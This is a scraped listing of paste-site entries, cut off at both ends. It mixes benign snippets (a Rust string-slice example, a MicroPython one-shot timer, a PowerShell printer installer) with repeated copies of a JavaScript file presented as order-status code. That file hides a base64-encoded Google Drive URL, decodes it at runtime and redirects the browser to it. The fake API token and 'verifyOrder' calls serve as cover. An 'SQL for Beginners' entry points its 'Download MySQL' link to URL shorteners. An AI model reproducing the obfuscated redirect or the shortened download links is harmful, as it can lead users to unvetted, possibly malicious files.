  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8az4eBUb,SQL for Beginners: Learn SQL Using MySQL and Database Design,f0f077,MySQL,Thursday 3rd of April 2025 08:45:13 AM CDT,"SQL for Beginners: Learn SQL Using MySQL and Database Design
Master the Fundamentals of Databases and SQL
Are you new to databases and SQL? This beginner-friendly guide will teach you how to design, query, and manage databases using MySQL, one of the world’s most popular database systems.

What You’ll Learn:
✅ Database Basics – Understand tables, schemas, and relationships
✅ SQL Fundamentals – Write queries to retrieve, insert, update, and delete data
✅ MySQL Setup – Install and configure MySQL for practice
✅ Database Design – Learn normalization, keys, and efficient table structures
✅ Advanced Queries – Master JOINs, subqueries, and aggregate functions
✅ Real-World Projects – Apply your skills with hands-on exercises

Why Learn SQL?
High Demand: SQL is essential for data analysis, backend development, and more

Universal Skill: Works with MySQL, PostgreSQL, SQL Server, and other databases

Career Growth: Opens doors to roles in data science, web development, and IT

Get Started Today!
Whether you're a developer, analyst, or just curious about databases, this guide will give you the foundation to work confidently with SQL and MySQL.

🔗 Download MySQL:https://short-jambo.ink/lz0URFV
📖 Practice Online: Try interactive SQL exercises on platforms like SQLZoo or LeetCode

Last Updated: [Current Date]
for more :https://cuty.io/ptBql6n
orhttps://short-jambo.ink/lz0URFV "
kz5EUqZs,Untitled,zachgordon25,Rust,Thursday 3rd of April 2025 08:37:36 AM CDT,"fn main() {
    let my_string = String::from(""hello world"");

    // `first_word` works on slices of `String`s, whether partial or whole
    let word = first_word(&my_string[0..6]);
    let word = first_word(&my_string[..]);
    // `first_word` also works on references to `String`s, which are equivalent
    // to whole slices of `String`s
    let word = first_word(&my_string);

    let my_string_literal = ""hello world"";

    // `first_word` works on slices of string literals, whether partial or whole
    let word = first_word(&my_string_literal[0..6]);
    let word = first_word(&my_string_literal[..]);

    // Because string literals *are* string slices already,
    // this works too, without the slice syntax!
    let word = first_word(my_string_literal);
}

fn first_word(s: &str) -> &str {
    let bytes = s.as_bytes();

    for (i, &item) in bytes.iter().enumerate() {
        if item == b' ' {
            return &s[..i];
        }
    }

    &s[..]
}

fn first_word_bad(s: &String) -> usize {
    let bytes = s.as_bytes();

    for (i, &item) in bytes.iter().enumerate() {
        if item == b' ' {
            return i;
        }
    }

    s.len()
}
"
MS3PemXy,Untitled,Epiphemeral,JavaScript,Thursday 3rd of April 2025 08:37:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/798/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GiuXN88t,Order.js,robloxhack212,JavaScript,Thursday 3rd of April 2025 08:06:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/363/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
thrccf39,MicroPython RP2 One Shot Timer Explorations,rclott,Python,Thursday 3rd of April 2025 07:46:44 AM CDT,"import time
from machine import Timer

class OneShot:
  def __init__(self, name, period, io):
    self.flag = False
    self.name = name
    self.period = period
    self.io = io
    self.io.lamp_clear(0)
    # self.timer = Timer()
    self.timer = Timer(period = self.period,
                    mode = Timer.ONE_SHOT,
                    callback = self.callback )
  def callback(self, t):
    self.flag = True
    self.io.lamp_toggle(0)
  def go(self):
    # self.timer.init()
    self.timer.init(period = self.period,
                    mode = Timer.ONE_SHOT,
                    callback = self.callback )
# testit 
io.lamp_clear(0)
io.lamp_set(1)
bang = OneShot('reply', 1000, io )
print('starting...')
while(True):
  if bang.flag:
    bang.flag = False;
    io.lamp_toggle(1)
    print('...')
    bang.go()
  time.sleep_ms(10)
"
FJJxScDa,Untitled,robloxhack212,JavaScript,Thursday 3rd of April 2025 07:35:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/482/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Vw1bxz9b,Dodawanie drukarki dodanej przez OptimiDoc Server,p-kl,PowerShell,Thursday 3rd of April 2025 07:30:56 AM CDT,"param (
    [switch]$Debug,
    [string]$DefaultServerAddress = ""192.168.8.39"",
    [string]$PrinterName = ""OptimiDocPrinter"",
    [string]$QueueUser = ""$env:USERNAME"",     # Changed to use Windows username as default
    [string]$QueueProject = """",  # New parameter for project part of queue name
    [string]$QueueCustom = """",   # New parameter for custom part of queue name
    [string]$DefaultDriver = """"  # New parameter for default driver
)

# Enable debug output if the -Debug switch is used
if ($Debug) { $DebugPreference = ""Continue"" }

Write-Debug ""DefaultServerAddress: $DefaultServerAddress""
Write-Debug ""PrinterName         : $PrinterName""
Write-Debug ""QueueUser           : $QueueUser""
Write-Debug ""QueueProject        : $QueueProject""
Write-Debug ""QueueCustom         : $QueueCustom""
Write-Debug ""DefaultDriver       : $DefaultDriver""
Write-Debug """"

# Load WPF module for GUI
Add-Type -AssemblyName PresentationFramework

# Ensure the logo file exists, download if necessary
$LogoPath = Join-Path $PSScriptRoot ""optimidoc-logo.png""
$LogoUrl = ""https://optimidoc.com/wp-content/uploads/2023/02/Group-3677@2x-600x92.png""
if (-not (Test-Path $LogoPath)) {
    Write-Debug ""Logo file not found. Downloading...""
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $LogoUrl -OutFile $LogoPath -ErrorAction Stop
        Write-Debug ""Logo downloaded successfully to $LogoPath""
    } catch {
        Write-Warning ""Failed to download logo: $_.Exception.Message""
    }
}
else {
        Write-Debug ""Logo was already downloaded""
}

Write-Debug """"

# Function to list available printer drivers excluding Microsoft and default system printers
Function Get-FilteredPrinterDrivers {
    Write-Debug ""Fetching filtered printer drivers...""
    Get-PrinterDriver | Where-Object {
        $_.Name -notmatch ""Microsoft"" `
                -and $_.Name `
                -notmatch ""XPS"" `
                -and $_.Name `
                -notmatch ""PDF"" `
                -and $_.Name `
                -notmatch ""Fax"" `
                -and $_.Name `
                -notmatch ""Anydesk""
    } | Select-Object Name
}

# Function to display a combined GUI dialog for all inputs
Function Show-CombinedInputDialog {
    Param (
        [array]$DriverList,
        [string]$ServerAddress
    )
    Write-Debug ""Showing combined input dialog...""
    Write-Debug ""DriverList: ""
    $DriverList | ForEach-Object { Write-Debug ""    $($_.Name)"" }
    Write-Debug ""PassedToInputServerAddress: $ServerAddress""

    $Window = New-Object System.Windows.Window
    $Window.Title = ""Printer Setup""
    $Window.Width = 500
    $Window.Height = 600 # Increased height to accommodate the new checkbox
    $Window.WindowStartupLocation = ""CenterScreen""
    $Window.Background = ""#333333"" # Dark gray background

    $StackPanel = New-Object System.Windows.Controls.StackPanel
    $StackPanel.Margin = 20
    $StackPanel.HorizontalAlignment = ""Center""
    $Window.Content = $StackPanel

    # Add OptimiDoc logo
    $Logo = New-Object System.Windows.Controls.Image
    try {
        $BitmapImage = New-Object System.Windows.Media.Imaging.BitmapImage
        $BitmapImage.BeginInit()
        $BitmapImage.UriSource = New-Object Uri($LogoPath, [UriKind]::Absolute)
        $BitmapImage.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
        $BitmapImage.EndInit()
        $Logo.Source = $BitmapImage
    } catch {
        Write-Warning ""Failed to load logo image: $_.Exception.Message""
    }
    $Logo.Width = 200
    $Logo.Margin = ""0,0,0,10""
    $StackPanel.Children.Add($Logo)

    # Check if printer exists

    Write-Debug ""Using printer name: $PrinterName""
    # $PrinterExists = Get-Printer | Where-Object {$_.Name -eq $PrinterName}
    # $DeleteExistingPrinter = $false

    # Checkbox to delete existing printer
    $CheckBoxDeletePrinter = New-Object System.Windows.Controls.CheckBox
    $CheckBoxDeletePrinter.Content = ""Delete existing printer if it exists""
    $CheckBoxDeletePrinter.IsChecked = $false
    $CheckBoxDeletePrinter.Margin = ""0,0,0,10""
    $CheckBoxDeletePrinter.Foreground = ""White""
    $StackPanel.Children.Add($CheckBoxDeletePrinter)

    # Printer Name Input
    $TextBlockPrinterName = New-Object System.Windows.Controls.TextBlock
    $TextBlockPrinterName.Text = ""Enter the printer name:""
    $TextBlockPrinterName.FontSize = 16
    $TextBlockPrinterName.FontWeight = ""Bold""
    $TextBlockPrinterName.Margin = ""0,0,0,5""
    $TextBlockPrinterName.Foreground = ""White""
    $StackPanel.Children.Add($TextBlockPrinterName)

    $TextBoxPrinterName = New-Object System.Windows.Controls.TextBox
    $TextBoxPrinterName.Width = 400
    $TextBoxPrinterName.Height = 30
    $TextBoxPrinterName.Margin = ""0,0,0,20""
    $TextBoxPrinterName.FontSize = 14
    $TextBoxPrinterName.Background = ""#F5F5F5""
    $TextBoxPrinterName.BorderBrush = ""#BDBDBD""
    $TextBoxPrinterName.Foreground = ""Gray""
    $TextBoxPrinterName.Text = $PrinterName # Default printer name
    $TextBoxPrinterName.Add_GotFocus({
        if ($TextBoxPrinterName.Foreground -eq ""Gray"") {
            $TextBoxPrinterName.Text = """"
            $TextBoxPrinterName.Foreground = ""Black""
        }
    })
    $TextBoxPrinterName.Add_LostFocus({
        if ([string]::IsNullOrWhiteSpace($TextBoxPrinterName.Text)) {
            $TextBoxPrinterName.Text = $PrinterName
            $TextBoxPrinterName.Foreground = ""Gray""
        }
    })
    $StackPanel.Children.Add($TextBoxPrinterName)

    # Printer Driver Selection
    $TextBlockDriver = New-Object System.Windows.Controls.TextBlock
    $TextBlockDriver.Text = ""Select a printer driver:""
    $TextBlockDriver.FontSize = 16
    $TextBlockDriver.FontWeight = ""Bold""
    $TextBlockDriver.Margin = ""0,0,0,10""
    $TextBlockDriver.Foreground = ""White""
    $StackPanel.Children.Add($TextBlockDriver)

    $RadioButtonGroup = New-Object System.Windows.Controls.StackPanel
    $RadioButtonGroup.Orientation = ""Vertical""
    $RadioButtonGroup.Margin = ""0,0,0,20""
    $StackPanel.Children.Add($RadioButtonGroup)

    # Initialize variables
    $SelectedDriver = """"
    $Window.Tag = $null

    # Radio Button Click Action
    $rbClickAction = {
        Param($sender)
        $script:SelectedDriver = $sender.Content
        Write-Debug ""Selected driver: $($script:SelectedDriver)""
    }

    foreach ($Driver in $DriverList) {
        $rb = New-Object System.Windows.Controls.RadioButton
        Write-Debug ""Building radiobutton for: $($Driver.Name)""
        $rb.Content = $Driver.Name
        $rb.GroupName = ""printerDriver""
        $rb.FontSize = 14
        $rb.Foreground = ""White""
        $rb.Margin = ""0,2,0,2""
        $rb.Add_Click($rbClickAction)
        if ($Driver.Name -eq $DefaultDriver) {
            $rb.IsChecked = $true
            $script:SelectedDriver = $Driver.Name
            Write-Debug ""Auto-selected default driver: $($Driver.Name)""
        }
        $RadioButtonGroup.Children.Add($rb)
    }

    # User Input (Queue Name Part 1)
    $TextBlockUser = New-Object System.Windows.Controls.TextBlock
    $TextBlockUser.Text = ""Enter user ('L prefix will be added):""
    $TextBlockUser.FontSize = 16
    $TextBlockUser.FontWeight = ""Bold""
    $TextBlockUser.Margin = ""0,10,0,5""
    $TextBlockUser.Foreground = ""White""
    $StackPanel.Children.Add($TextBlockUser)

    $TextBoxUser = New-Object System.Windows.Controls.TextBox
    $TextBoxUser.Width = 400
    $TextBoxUser.Height = 30
    $TextBoxUser.Margin = ""0,0,0,20""
    $TextBoxUser.FontSize = 14
    $TextBoxUser.Background = ""#F5F5F5""
    $TextBoxUser.BorderBrush = ""#BDBDBD""
    $TextBoxUser.Text = $QueueUser  # Set default value from parameter
    $TextBoxUser.Foreground = if ([string]::IsNullOrWhiteSpace($QueueUser)) { ""Gray"" } else { ""Black"" }
    $StackPanel.Children.Add($TextBoxUser)

    # Project Input (Queue Name Part 2)
    $TextBlockProject = New-Object System.Windows.Controls.TextBlock
    $TextBlockProject.Text = ""Enter project ('P prefix will be added):""
    $TextBlockProject.FontSize = 16
    $TextBlockProject.FontWeight = ""Bold""
    $TextBlockProject.Margin = ""0,10,0,5""
    $TextBlockProject.Foreground = ""White""
    $StackPanel.Children.Add($TextBlockProject)

    $TextBoxProject = New-Object System.Windows.Controls.TextBox
    $TextBoxProject.Width = 400
    $TextBoxProject.Height = 30
    $TextBoxProject.Margin = ""0,0,0,20""
    $TextBoxProject.FontSize = 14
    $TextBoxProject.Background = ""#F5F5F5""
    $TextBoxProject.BorderBrush = ""#BDBDBD""
    $TextBoxProject.Text = $QueueProject  # Set default value from parameter
    $TextBoxProject.Foreground = if ([string]::IsNullOrWhiteSpace($QueueProject)) { ""Gray"" } else { ""Black"" }
    $StackPanel.Children.Add($TextBoxProject)

    # Custom Queue Input (Queue Name Part 3)
    $TextBlockCustomQueue = New-Object System.Windows.Controls.TextBlock
    $TextBlockCustomQueue.Text = ""Enter custom queue name ('Q prefix will be added):""
    $TextBlockCustomQueue.FontSize = 16
    $TextBlockCustomQueue.FontWeight = ""Bold""
    $TextBlockCustomQueue.Margin = ""0,10,0,5""
    $TextBlockCustomQueue.Foreground = ""White""
    $StackPanel.Children.Add($TextBlockCustomQueue)

    $TextBoxCustomQueue = New-Object System.Windows.Controls.TextBox
    $TextBoxCustomQueue.Width = 400
    $TextBoxCustomQueue.Height = 30
    $TextBoxCustomQueue.Margin = ""0,0,0,20""
    $TextBoxCustomQueue.FontSize = 14
    $TextBoxCustomQueue.Background = ""#F5F5F5""
    $TextBoxCustomQueue.BorderBrush = ""#BDBDBD""
    $TextBoxCustomQueue.Text = $QueueCustom  # Set default value from parameter
    $TextBoxCustomQueue.Foreground = if ([string]::IsNullOrWhiteSpace($QueueCustom)) { ""Gray"" } else { ""Black"" }
    $StackPanel.Children.Add($TextBoxCustomQueue)

    # Server Address Input
    $TextBlockServer = New-Object System.Windows.Controls.TextBlock
    $TextBlockServer.Text = ""Enter the server address:""
    $TextBlockServer.FontSize = 16
    $TextBlockServer.FontWeight = ""Bold""
    $TextBlockServer.Margin = ""0,10,0,5""
    $TextBlockServer.Foreground = ""White""
    $StackPanel.Children.Add($TextBlockServer)

    $TextBoxServer = New-Object System.Windows.Controls.TextBox
    $TextBoxServer.Width = 400
    $TextBoxServer.Height = 30
    $TextBoxServer.Margin = ""0,0,0,20""
    $TextBoxServer.FontSize = 14
    $TextBoxServer.Background = ""#F5F5F5""
    $TextBoxServer.BorderBrush = ""#BDBDBD""
    $TextBoxServer.Foreground = ""Gray""
    $TextBoxServer.Text = $ServerAddress
    $TextBoxServer.Add_GotFocus({
        if ($TextBoxServer.Foreground -eq ""Gray"") {
            $TextBoxServer.Text = """"
            $TextBoxServer.Foreground = ""Black""
        }
    })
    $TextBoxServer.Add_LostFocus({
        if ([string]::IsNullOrWhiteSpace($TextBoxServer.Text)) {
            $TextBoxServer.Text = $ServerAddress
            $TextBoxServer.Foreground = ""Gray""
        }
    })
    $StackPanel.Children.Add($TextBoxServer)

    # OK Button
    $Button = New-Object System.Windows.Controls.Button
    $Button.Content = ""Install Printer""
    $Button.Width = 100
    $Button.Height = 40
    $Button.Background = ""#2196F3""
    $Button.Foreground = ""White""
    $Button.HorizontalAlignment = ""Center""
    $StackPanel.Children.Add($Button)

    $Button.Add_Click({
        if ([string]::IsNullOrEmpty($script:SelectedDriver)) {
            [System.Windows.MessageBox]::Show(""Please select a printer driver."", ""Error"", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error) | Out-Null
            return
        }

        # Build Queue Name from three parts
        $queueName = """"
        if (-not [string]::IsNullOrWhiteSpace($TextBoxUser.Text)) {
            $queueName += ""'L$($TextBoxUser.Text.Trim())""
        }
        if (-not [string]::IsNullOrWhiteSpace($TextBoxProject.Text)) {
            $queueName += ""'P$($TextBoxProject.Text.Trim())""
        }
        if (-not [string]::IsNullOrWhiteSpace($TextBoxCustomQueue.Text)) {
            $queueName += ""'Q$($TextBoxCustomQueue.Text.Trim())""
        }

        Write-Debug ""Generated Queue Name: $queueName""

        $Window.Tag = @{
            DeleteExisting = $CheckBoxDeletePrinter.IsChecked
            PrinterName = $TextBoxPrinterName.Text.Trim()
            Driver = $script:SelectedDriver
            ServerAddress = $TextBoxServer.Text.Trim()
            QueueName = $queueName
        }
        $Window.Close()
    })

    $Window.ShowDialog() | Out-Null
    return $Window.Tag
}

Write-Debug """"

# Main script execution
$DriverList = Get-FilteredPrinterDrivers
$inputResult = Show-CombinedInputDialog -DriverList $DriverList -ServerAddress $DefaultServerAddress

# Validate inputs
If ([string]::IsNullOrEmpty($inputResult.Driver)) {
    Write-Host ""No printer driver selected.""
    Exit
}
If ([string]::IsNullOrWhiteSpace($inputResult.QueueName)) {
    [System.Windows.MessageBox]::Show(""Printer queue name cannot be empty."", ""Error"", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error) | Out-Null
    Exit
}
If ([string]::IsNullOrWhiteSpace($inputResult.ServerAddress)) {
    [System.Windows.MessageBox]::Show(""Server address cannot be empty."", ""Error"", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error) | Out-Null
    Exit
}

# Check if printer exists and prompt to delete if requested
if (-not $inputResult.DeleteExisting) {
    if (Get-Printer | Where-Object {$_.Name -eq $inputResult.PrinterName}) {
        $result = [System.Windows.MessageBox]::Show(""Printer '$($inputResult.PrinterName)' already exists. Do you want to delete it?"", ""Confirm Delete"", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
        if ($result -eq ""Yes"") {
            Write-Host ""Deleting existing printer and port...""
            try {
                # Delete printer
                Remove-Printer -Name $inputResult.PrinterName -ErrorAction Stop
                Write-Debug ""Printer '$($inputResult.PrinterName)' deleted successfully.""

                # Delete printer port
                $portNameToDelete = ""lpr://$($inputResult.ServerAddress)/$($inputResult.QueueName)""
                if (Get-PrinterPort | Where-Object {$_.Name -eq $portNameToDelete}) {
                    Remove-PrinterPort -Name $portNameToDelete -ErrorAction Stop
                    Write-Debug ""Printer port '$portNameToDelete' deleted successfully.""
                }
            } catch {
                Write-Warning ""Failed to delete existing printer or port: $_""
                [System.Windows.MessageBox]::Show(""Failed to delete existing printer or port: $_"", ""Error"", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error) | Out-Null
            }
        }
    }
}

# Delete existing printer and port if requested
if ($inputResult.DeleteExisting) {
    Write-Host ""Deleting existing printer and port...""
    try {
        # Delete printer
        if (Get-Printer | Where-Object {$_.Name -eq $inputResult.PrinterName}) {
            Remove-Printer -Name $inputResult.PrinterName -ErrorAction Stop
            Write-Debug ""Printer '$($inputResult.PrinterName)' deleted successfully.""
        }

        # Delete printer port
        $portNameToDelete = ""lpr://$($inputResult.ServerAddress)/$($inputResult.QueueName)""
        if (Get-PrinterPort | Where-Object {$_.Name -eq $portNameToDelete}) {
            Remove-PrinterPort -Name $portNameToDelete -ErrorAction Stop
            Write-Debug ""Printer port '$portNameToDelete' deleted successfully.""
        }
    } catch {
        Write-Warning ""Failed to delete existing printer or port: $_""
        [System.Windows.MessageBox]::Show(""Failed to delete existing printer or port: $_"", ""Error"", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error) | Out-Null
    }
}

# Add the LPR printer port and printer
$printerName = $inputResult.PrinterName
$queue       = $inputResult.QueueName # Queue name
$portName    = ""$($printerName) $($queue)""

Write-Debug ""Adding printer port with the following details:""
Write-Debug ""Port Name      : $portName""
Write-Debug ""LprHostAddress : $($inputResult.ServerAddress)""
Write-Debug ""LprQueueName   : $queue""

Try {
    # Check if the port already exists
    $existingPort = Get-PrinterPort | Where-Object {$_.Name -eq $portName}
    if ($existingPort) {
        Write-Warning ""Port '$portName' already exists. Attempting to delete it.""
        Remove-PrinterPort -Name $portName -ErrorAction Stop
    }

    $printerAddPrinterPortArguments = @{
                  Name = $portName
        LprHostAddress = $inputResult.ServerAddress
          LprQueueName = $queue
    }
    
    # Write-Debug """"
    # Write-Debug @printerAddPrinterPortArguments
    # Write-Debug """"

    Add-PrinterPort @printerAddPrinterPortArguments


    Write-Debug ""Printer port '$portName' added successfully.""
} Catch {
    Write-Debug ""Failed to add printer port. $_""
    [System.Windows.MessageBox]::Show(""Failed to add printer port. $_"", ""Error"", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error) | Out-Null
    Exit
}

Write-Debug ""Adding printer with the following details:""
Write-Debug ""Printer Name  : $printerName""
Write-Debug ""Driver Name   : $($inputResult.Driver)""
Write-Debug ""Port Name     : $portName""
Write-Debug ""Server addr   : $($inputResult.ServerAddress)""
Write-Debug ""Queue         : $($inputResult.QueueName)""

Write-Host ""Adding printer : $printerName
        driver : $($inputResult.Driver)
   server addr : $($inputResult.ServerAddress)
         queue : $($inputResult.QueueName)""

Try {
    Add-Printer -Name           $printerName `
                -PortName       $portName `
                -DriverName     $inputResult.Driver `
                -ErrorAction    Stop
    [System.Windows.MessageBox]::Show(""Printer '$printerName' added successfully."", ""Success"", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information) | Out-Null
} Catch {
    [System.Windows.MessageBox]::Show(""Failed to add printer. $_"", ""Error"", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error) | Out-Null
}
"
Pvj1RaNy,Market.js,robloxhack212,JavaScript,Thursday 3rd of April 2025 06:49:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/702/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BTUXggcS,Products.js,robloxhack212,JavaScript,Thursday 3rd of April 2025 06:18:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/727/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4VY6GkzR,Order.js,robloxhack212,JavaScript,Thursday 3rd of April 2025 06:03:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/534/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XDQDnuSg,dataNone,TestGuy1,JSON,Thursday 3rd of April 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '2f882f75630019b66787fe895a65385a6c5bd90bc9803464537edbfa81a826421f6f8d58565992ac829a203e781374b9c864123c063f042d3d099da3982cf2a97f96c737a597e24d8a89c6c4166855d910ced0b470515595b9cb5d6904d17fa817dbf615f793978e3d1136bd83b3ff6aab337b5fd986a828695293117201b6fb',
  otherdata: [
    'e78b365e94613ff88ed44ae4121e3665',
    'a7a7f99435df90907379611357524aff',
    'a0569ccb30d9fcbc8b09533634f5c801',
    '97c7fcc63cc217ae3f544487591a592c',
    '49725529225ea0a29a6405618d886ae1',
    '35ea419a420d90f091396956b1cbf8c8',
    'b6c1440590fc860a3ab1e2a19e22592d',
    '7713195932351bd4023d675bc1d35f80'
  ]
}"
CfEVPhTi,Market.js,robloxhack212,JavaScript,Thursday 3rd of April 2025 05:47:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/948/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
